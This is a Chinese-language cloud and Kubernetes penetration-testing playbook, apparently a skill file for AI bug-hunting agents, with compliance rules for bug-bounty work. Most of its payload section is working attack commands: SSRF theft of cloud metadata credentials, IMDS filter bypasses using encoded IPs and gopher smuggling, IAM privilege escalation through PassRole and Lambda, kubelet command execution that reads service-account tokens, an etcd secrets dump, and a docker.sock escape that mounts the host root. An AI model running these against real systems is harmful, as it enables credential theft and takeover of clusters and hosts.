# 云安全（AWS / GCP / Azure / K8s）

> 从「Web 漏洞」升级到「云资产」：SSRF 窃取云元数据凭据、S3/存储桶配置错误、K8s 未授权、AK/SK 泄露、对象存储匿名读写。SSRF 入口拿到后云资产价值最高的一步——一条 K8s API 匿名 cluster-admin 或 docker.sock 逃逸即可接管集群/宿主机。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) + `hunt-k8s/SKILL.md`
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：HackTricks Cloud / AWS IAM 权限参考

---

## 1. 触发信号

- 目标运行在云 / 容器：域名指向 `*.s3*.amazonaws.com`、Firebase/`appspot`、暴露 K8s 端口（6443/10250/2379/8443）`[Claude-BugHunter]`
- 已有 SSRF / 内网可达，能请求 `169.254.169.254` 或 `metadata.google.internal` `[本地 src-hunter]`
- 泄露凭据：AK/SK、GCP SA JSON、`~/.aws`、CI secret、JS bundle 里的 IAM 凭据 `[Claude-Red]`
- 已拿到 Pod shell / 容器内权限，需要逃逸到宿主机 `[本地 src-hunter]`

## 2. 高频入口点

**云元数据端点** `[本地 src-hunter]`：
| 云 | 地址 | 特殊要求 |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IMDSv1 无需 Header；v2 需 PUT token |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | `Metadata: true` |

**K8s 端口**（nmap 扫 `443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010`）`[Claude-BugHunter hunt-k8s]`：10250 = kubelet exec/run；10255 = 只读（无 exec）；2379 = etcd；6443 = API server；44134 = Helm2/Tiller。

**S3 桶名猜解前缀/后缀**：`""|www-|dev-|staging-|backup-|logs-|assets-|static-` × `""|-prod|-dev|-staging|-backup|-data|-assets` `[本地 src-hunter]`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **身份识别（只读）**：`aws sts get-caller-identity` / `az account show` / `gcloud auth list`，不写任何东西 `[Claude-Red]`。
2. **匿名读探测**：S3/GCS/Blob 用 `--no-sign-request` 测 list/read；Firebase `/.json` 读 `[Claude-BugHunter hunt-cloud-misconfig]`。
3. **元数据 SSRF**：经 SSRF 代理请求 IMDS 拿临时凭据 → `sts get-caller-identity` 验证 `[本地 src-hunter]`。
4. **K8s 指纹 + 匿名权限**：`/version` 取 `gitVersion`（gating 后续 CVE）；SelfSubjectReview / SelfSubjectRulesReview 看真实权限 `[Claude-BugHunter hunt-k8s]`。
5. **Kubelet RCE**：10250 `/run`（直接回显）优先于 `/exec`（SPDY/WebSocket 流）；或经 API server `nodes/proxy` 中转 `[Claude-BugHunter hunt-k8s]`。
6. **etcd 2379 dump**：无 auth 读 `/registry/secrets` → 全套 Secret 明文（未开 EncryptionConfiguration 时）`[Claude-BugHunter hunt-k8s]`。
7. **IAM 提权 / docker.sock 逃逸**：PassRole+Lambda、CreatePolicyVersion、docker.sock 特权容器绑宿主根 `[本地 src-hunter][Claude-BugHunter hunt-k8s]`。

> 每步命中即停并取证；权限检查不命中（空 `items: []`）就降级——匿名 `200` ≠ cluster-admin（见 §6）。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测

```bash
# S3 匿名列举 + 权限测试  [本地 src-hunter]
aws s3 ls "s3://{BUCKET}" --no-sign-request
aws s3api get-bucket-policy --bucket {BUCKET} --no-sign-request | jq

# 元数据凭据窃取（经 SSRF）  [本地 src-hunter]
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://{TARGET}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}"

# K8s 端口指纹  [Claude-BugHunter hunt-k8s]
curl -sk "https://$TARGET:6443/version"      # {"major":"1","minor":"29",...}
```

### 4.2 数据提取 / 进阶

**S3 敏感数据搜索** `[本地 src-hunter]`：

```bash
aws s3 ls "s3://{BUCKET}" --recursive --no-sign-request | tee s3_listing.txt
grep -iE "\.(sql|bak|env|key|pem|pfx|p12|csv|xls|doc|pdf|config|yml|json|log|dump)" s3_listing.txt
```

**IAM 提权（PassRole + Lambda）** `[本地 src-hunter]`：

```bash
aws lambda create-function --function-name security-test --runtime python3.9 \
  --handler lambda.handler --zip-file fileb:///tmp/lambda.zip \
  --role arn:aws:iam::{ACCOUNT}:role/{HIGH_PRIV_ROLE}   # 需 iam:PassRole + lambda:CreateFunction
aws lambda invoke --function-name security-test /tmp/output.json
```

**Kubelet `/run` 直接回显（优先于 `/exec`）** `[Claude-BugHunter hunt-k8s]`：

```bash
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

**etcd 2379 未授权 dump** `[Claude-BugHunter hunt-k8s]`：

```bash
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix | strings | grep -Ei 'token|password|tls.key' | head -40
```

**docker.sock 特权容器逃逸** `[Claude-BugHunter hunt-k8s]`：

```bash
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/create?name=poc \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

### 4.3 Bypass 矩阵

**IMDS 过滤绕过** `[本地 src-hunter]`：

```bash
# IP 变形 / DNS 重绑定 / 协议走私
http://[::ffff:169.254.169.254]
http://0xa9fea9fe          # 2852039166 / 169.254.169.254.nip.io
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a
```

**S3 访问限制绕过** `[本地 src-hunter]`：换区域端点（`--region us-west-2`）/ 路径格式（`s3.amazonaws.com/{BUCKET}/`）/ 任意已认证账号（桶策略允许 `AuthenticatedUsers`）。

**K8s PSP/OPA 绕过** `[本地 src-hunter]`：用非 default 命名空间 / ephemeral containers / CronJob（部分策略不覆盖）。

## 5. 工具用法

```bash
# AWS 枚举 + 提权
aws sts get-caller-identity
python3 enumerate-iam.py --access-key {AK} --secret-key {SK}      # [本地 src-hunter]
pacu  # > import_keys {AK} {SK}  > run iam__enum_permissions  > run iam__privesc_scan
pmapper graph --create && pmapper analysis --output-type text     # [本地 src-hunter]

# K8s
kubeletctl --server $TARGET exec "id" -p $POD -c $CTR -n $NS      # 处理 /exec 流传输  [Claude-BugHunter hunt-k8s]
# GCP
python gcp_scanner.py -k gcp.json -o out/                          # [Claude-Red]

# 本地验证（不碰真云）
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0   # [Claude-BugHunter hunt-cloud-misconfig]
```

## 6. 证据要求

**K8s/云类 = RCE/凭据泄露级别，House Rule：证明状态变更或数据读取，绝不凭状态码推断** `[Claude-BugHunter hunt-k8s]`：
- 匿名 `200` 的 `/api/v1/namespaces`（空 `items: []`）≠ cluster-admin；必须 SelfSubjectRulesReview 显示特权动词 + 实际读到一个 Secret 值。
- 10255（只读）≠ 10250；「kubelet RCE」必须来自 10250 `/run` 输出或完成的 `/exec` 流，而不是裸 302。
- 越权写桶：必须写唯一 marker + 干净会话回读，才可报告 `[Claude-BugHunter hunt-cloud-misconfig]`。
- 逃逸证明 = artifact：`/run` 的 `id`/`hostname` 字面输出；docker.sock 逃逸 = 节点 `/etc/hostname`（区别于容器）；etcd = 解码后的 Secret 字节（脱敏）。

**严重度参考** `[Claude-BugHunter hunt-k8s]`：API 匿名→读 Secret / kubelet 或 nodes-proxy RCE / etcd dump / docker.sock 逃逸 / CVE-2018-1002105 = **Critical**；Dashboard 免登录数据访问、暴露 Tiller = **High**；只读 kubelet 10255、匿名 `/version`/`/pods` 信息泄露 = **Medium**。

## 7. 合规边界 / 不要做的事

- **禁**：写/删云资源或 K8s 对象。写桶测试后立即 `aws s3 rm` 清理测试文件 `[本地 src-hunter]`。
- **禁**：用窃取凭据列举/导出真实数据证明「能读」即可，不 dump 全桶/全库；只读 PoC。
- **禁**：在生产 workload 里 exec 证明 RCE——用自建的测试 pod/namespace，或仅单次非破坏性 `id` 后停止 `[Claude-BugHunter hunt-k8s]`。
- **禁**：实际执行 IAM 提权链（attach AdministratorAccess / 建 admin 密钥）——「能」即可，不落子。
- **脱敏**：报告中的 AK/SK、SA token、Secret 值只写前 4 + 后 4 或 sha256；OOB 用 Burp Collaborator/interactsh 确认。
